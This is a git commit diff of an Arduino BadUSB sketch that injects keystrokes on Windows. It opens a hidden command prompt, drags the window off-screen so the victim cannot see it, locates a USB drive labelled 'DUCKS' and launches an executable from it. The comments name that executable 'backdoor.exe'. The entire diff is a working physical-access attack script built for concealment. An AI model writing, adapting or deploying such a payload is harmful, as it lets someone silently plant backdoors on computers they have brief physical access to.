7d4b1314a253d2d53e588da8449702c5c58bf0d3
hkrsanjeet <43851687+hkrsanjeet@users.noreply.github.com>
2020-01-15 17:34:53 +0530

    Update and rename run exe from usb to run exe from usb.ino

--- run exe from usb.ino
+++ run exe from usb.ino
@@ -1,3 +1,7 @@
+//DUCKS = My USB Drive label
+//lesion = variable ,you can choose anything
+//backdoor.exe = file in usb Drive
+
 #include "Keyboard.h"
 
 void typeKey(int key)
@@ -16,27 +20,41 @@ void setup()
   // Wait 500ms
   delay(500);
 
+  delay(3000);
+
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
-  // Wait 1000ms
+
   delay(1000);
 
   Keyboard.print("cmd /Q /D /T:7F /F:OFF /V:ON /K");
-  //Keyboard.print("cmd");
+
   delay(1000);
-  
+
   typeKey(KEY_RETURN);
-  delay(1500);
+
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+
+  Keyboard.print("M");
+
+  for(int i = 0; i < 100; i++) {
+    typeKey(KEY_DOWN_ARROW);
+  }
+
+  typeKey(KEY_RETURN);
+
   Keyboard.print("for /f %d in ('wmic volume get driveletter^, label ^| find \"DUCKS\"') do set lesion=%d");
 
   typeKey(KEY_RETURN);
-  delay(3000); 
+
+  delay(1000);
+
   Keyboard.print("START %lesion%\\putty.exe && exit");
-  
-  typeKey(KEY_RETURN);
-  
-  Keyboard.releaseAll();
 
   typeKey(KEY_RETURN);
 
